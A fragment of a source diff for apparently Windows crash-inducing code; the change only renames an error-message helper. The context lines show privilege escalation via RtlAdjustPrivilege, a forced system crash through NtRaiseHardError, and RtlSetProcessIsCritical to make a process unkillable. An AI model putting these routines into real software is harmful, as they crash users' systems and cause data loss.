@@ -19,11 +19,11 @@
 		if (!RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bl)) {
 			UINT u;
 			if (NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, NULL, NULL, OPTION_SHUTDOWN_SYSTEM, &u)) {
-				fnMESSAGEHANDLERW(NULL, L"Failed to raise HardError", L"NtRaiseHardError", MB_ICONERROR);
+				fnMessageHandlerW(NULL, L"Failed to raise HardError", L"NtRaiseHardError", MB_ICONERROR);
 				return FALSE;
 			}
 		} else {
-			fnMESSAGEHANDLERW(NULL, L"Couldn't set Shutdwon Privileges", L"RtlAdjustPrivilege", MB_ICONERROR);
+			fnMessageHandlerW(NULL, L"Couldn't set Shutdwon Privileges", L"RtlAdjustPrivilege", MB_ICONERROR);
 			return FALSE;
 		}
 	}
@@ -36,11 +36,11 @@
 			if (!RtlSetProcessIsCritical(blIsCritical, NULL, FALSE)) {
 				return TRUE;
 			} else {
-				fnMESSAGEHANDLERW(NULL, L"Couldn't set Process Critical", L"RtlSetProcessIsCritical", MB_ICONERROR);
+				fnMessageHandlerW(NULL, L"Couldn't set Process Critical", L"RtlSetProcessIsCritical", MB_ICONERROR);
 				return FALSE;
 			}
 		} else {
-			fnMESSAGEHANDLERW(NULL, L"Couldn't set Debug Privileges", L"RtlAdjustPrivilege", MB_ICONERROR);
+			fnMessageHandlerW(NULL, L"Couldn't set Debug Privileges", L"RtlAdjustPrivilege", MB_ICONERROR);
 			return FALSE;
 		}
 	}
